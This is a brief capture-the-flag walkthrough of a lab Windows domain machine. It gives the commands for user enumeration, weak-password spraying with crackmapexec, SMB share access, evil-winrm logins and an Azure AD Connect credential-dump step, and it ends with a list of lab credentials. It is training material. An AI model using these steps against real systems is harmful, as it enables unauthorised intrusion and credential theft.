So we have some ports open but we don't know what to use
First, we will run enum4linux and get a bunch of users. With them we try weak passwords, if we get any luck with those [ crackmapexec -u user -p user --shares 10.10.10.172 ]. And we find a match on the user SABatchJobs.
With this one we login on smb, `./smbclient.py SABatchJobs:SABatchJobs@10.10.10.172` with which we search into shares. On the `users$` we have access and here is an azure.xml file that contains the magical password for our user. 
Now we got the user, mhope! `evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172`

Heading to the root.
Now we see that this server is running Azure. Let's try to find an exploit that uses the this. `Azure AD Connect`
The script must be edited, the way you connect to the database.
Now upload it and run it, you got the administrator credentials.
Rooted. `evil-winrm -u administrator -p d0m@in4dminyeah! -i 10.10.10.172`

Users:
-> SABatchJobs:SABatchJobs
-> mhope:4n0therD4y@n0th3r$
-> administrator:d0m@in4dminyeah!
